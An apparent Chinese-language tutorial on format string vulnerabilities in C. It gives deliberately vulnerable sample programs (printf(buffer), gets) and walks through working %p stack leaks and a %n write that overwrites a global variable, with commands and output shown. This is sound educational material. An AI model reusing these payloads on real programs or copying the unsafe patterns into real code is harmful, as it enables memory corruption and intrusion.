# Format String Vulnerability 1



​	格式化字符串漏洞是由于不良的编程实践导致的。如果一个程序，把用户输入作为参数没有做严格的校验就使用如 `printf` 、`sprintf`、`fprintf` 这类的函数进行格式化输出。那么攻击者可以通过利用漏洞实现任意内存读写。



下面是一段示例代码：

```C
int main(int argc, char** argv) {
    char buffer[100];
    strcpy(buffer, argv[1]);
    printf(buffer);
    return 0;
}
```



`printf` 函数接收多个参数，它本身不能识别接收的参数个数，而是需要程序员通过使用格式化占位符，来指定要接收的参数个数以及参数的类型。



了解printf是如何读取多个参数的：

[this](https://www.tutorialspoint.com/cprogramming/c_variable_arguments.htm).

了解格式化占位符：

[this](http://www.cplusplus.com/reference/cstdio/printf/).



对于上面的示例代码，假设你给程序一个正常的输入，如输入你的用户名，像这样： `./string0 Rohit`

你会得到和你输入一样的字符串作为输出。但攻击者并不会按照你程序设想的来。假设你喂给程序的输入是 一个 `%x` （因为攻击者知道`printf`函数接收的第一个参数是格式化字符串，所以这没有什么奇怪的。）一个畸形的格式化字符串也许能泄露出栈上面的内容。



:astonished: 攻击者可以获取到 Stack 中的内容。​



### 获取栈上面的内容



尝试这样执行：

```bash
$ ./string0 "%p %p %p %p %p"
0xffffd7c9 0x64 0xf0b5ff 0xffffd58e 0x1
$
```
瞧，发生了什么？



`%p` 是以十六进制格式打印内存中的内容的格式化占位符。攻击者戏弄 **printf** ，通过喂给程序格式化占位符，而不是一般的字符串，让它打印出内存中的内容。这就是格式化字符串漏洞。



### 除此之外还能做什么？



不仅仅是泄露内存数据。这类型的漏洞可以允许攻击者写任意内存。要想理解写任意内存的实现原理，我们需要先弄清楚一个特殊的格式化占位符：`%n` 。这个占位符可以让 **printf** 根据后面跟的一个参数，写任意内存地址。

e.g

```C
printf("rohit%n", &i);
printf("%d", i);   //outputs to 5 == len(rohit)
```


简单讲，`%n` 把前面字符串中字符的个数写到变量`i`的地址内存中。





现在我们明确了两样东西：

* 复用格式化占位符作为 printf() 的传入参数来获取内存中的数据.
* 修改Stack上任意内存空间(变量的值).



### 来看一个实际的利用 :metal:




利用格式化字符串很重要的一点在于确定offset。首先我们需要确定大概需要跳过多少个4byte大小（x86）的内存，然后就可以触碰到buffer。为了确定这个offset，我首先输入 `AAAA` 作为buffer的起始，使用下面的payload进行测试：

​	``./string1 'AAAA %p %p %p %p %p %p %p %p %p %p %p %p'``

得到的程序输出如下：

​	`AAAA 0xffffd7af 0x64 0xf0b5ff 0xffffd57e 0x1 0xc2 0xffffd674 0xffffd57e
0xffffd680 0x41414141 0x20702520 0x25207025`



留意这里，`0x41414141` 是在程序输出中的倒数第三个。对应就是我们输入的AAAA。这就意味着我们越过9个 `%p`后，也就是第10个的时候就是我们的buffer的位置。你需要自己在自己的环境中进行测试，你可能会是跟我这里不一样的offset。

```C
#include<stdio.h>
#include<string.h>
#include<stdio.h>

int myvar;

int main(int argc, char** argv)
{
    char buffer[100];
    gets(buffer);
    printf(buffer);
    if(myvar)
        printf("Cool you changed it .. :) ");
    return 0;
}
```


​	现在，我要来证明如何使用我们已经学到的知识来改变程序的控制流。请看上面这段代码，利用前面讲的方法通过利用格式化字符串漏洞来确定到buffer的offset。进一步确定buffer的address。

`echo -e 'AAAA %p %p %p %p %p %p %p %p %p %p %p %p' | ./string1`

​	Output:

`AAAA 0x1 0xf7ffd918 0xf0b5ff 0xffffd59e 0x1 0xc2 0xffffd694 0xffffd59e
0xffffd69c 0x41414141 0x20702520 0x25207025`.

​	在我这个环境中这里同样是在 第10个位置上。:metal:

接下来思考一下：

`echo -e 'AAAA %p %p %p %p %p %p %p %p %p %n' | ./string1`

​	执行上面这段命令，会把格式化字符串的长度 `len(AAAA %p %p %p %p %p %p %p %p %p ) --> 32` 也就是十进制的 32 写到第10个参数所在的内存中。而第10个参数就是对应的我们的 `0x41414141` 因此，这就是说这段payload会把内存中原来的 `0x41414141` 覆写为值32。但如果内存被设置为 **read-only** 你会得到一个 `Segmentation Fault` 

​	那么对于这种情况，假如说我们喂给程序的是一个有意义的值，而不是 `0x41414141` 那又会怎样呢？如此一来，使用 `%n` 就可以把值写到我们提供的内存地址了。



​	对于上面这个案例，我们可以通过静态的方式去拿变量 `myvar` 的地址。

`objdump -t ./string1 | grep myvar`
`0804a028 g     O .bss    00000004              myvar`

​	第一列所对应的就是`myvar`变量的地址。

​	接着我们要构造exploit实现修改程序中变量的值来实现修改程序后面的控制流结构。

`` echo -e `python -c "import struct; print struct.pack('<I',0x0804a028)"`"%p %p
%p %p %p %p %p %p %p %n" | ./string1``

​	得到如下的输出：

``(0x1 0xf7ffd918 0xf0b5ff 0xffffd59e 0x1 0xc2 0xffffd694 0xffffd59e 0xffffd69c
Cool you changed it .. :)``

​	:cool: 我们成功地利用了这个漏洞。



#### 学到了什么：



​	利用格式化字符串漏洞，我们可以exploit程序，实现修改任意地址内存中的值。